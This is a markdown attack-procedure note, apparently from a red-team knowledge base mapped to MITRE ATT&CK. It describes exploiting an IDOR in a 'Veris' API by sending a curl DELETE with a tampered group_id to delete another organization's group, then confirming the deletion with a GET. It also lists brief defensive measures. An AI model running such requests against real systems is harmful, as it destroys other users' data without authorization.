---
tags:
  - idor
  - web
  - execution
  - verification
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-modify-group-id]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 59c929a8-4977-4dff-b8fd-9250b7c49fd4
created_at: '2025-12-14T17:25:23.190Z'
updated_at: '2025-12-14T17:25:23.190Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute-Modified-Deletion-and-Verify

## Summary

This procedure submits the modified HTTP DELETE request to delete an unauthorized group in Veris and verifies the success of the IDOR exploitation through response analysis and application checks.

## Description

After tampering with the group_id, this step executes the request against the Veris API, exploiting the lack of validation to remove the target group. Verification involves checking the HTTP response for success codes and confirming the group's absence via the UI or subsequent API calls. This demonstrates the full impact of the IDOR, including data loss and cross-organization privilege escalation. The attack assumes an authenticated session and direct API access.

## Requirements

1. Modified DELETE request with target group_id
2. Valid authentication token
3. Access to verify deletion (e.g., API or UI in target org, if possible)

## Defense

Defensive measures and detection strategies:

- Audit all successful deletions for cross-organization anomalies
- Implement idempotency checks and transaction logging for group operations
- Deploy intrusion detection systems (IDS) to flag unauthorized API parameter usage

## Objectives

1. Successfully delete the target group remotely
2. Confirm no authorization enforcement
3. Validate impact through evidence of data loss

## Instructions

### Step 1: Submit the Request

**Context**: Forward the tampered request to the server.

**Command** ([[commands/curl-modify-group-id]]):
```bash
curl -X DELETE 'https://veris.example.com/api/groups/{target-group-id}' -H 'Authorization: Bearer {token}' -H 'Content-Type: application/json' -v
```

> The -v flag shows verbose output; expect 200 OK or similar success response.

### Step 2: Verify Deletion

**Context**: Check the application's state to confirm removal.

**Command** ([[commands/curl-modify-group-id]]):
```bash
curl -X GET 'https://veris.example.com/api/groups/{target-group-id}' -H 'Authorization: Bearer {token}'
```

> Expected output: 404 Not Found or error indicating group does not exist, confirming deletion.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-modify-group-id]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[idor]]
- [[web]]
- [[Execution]]
- [[verification]]
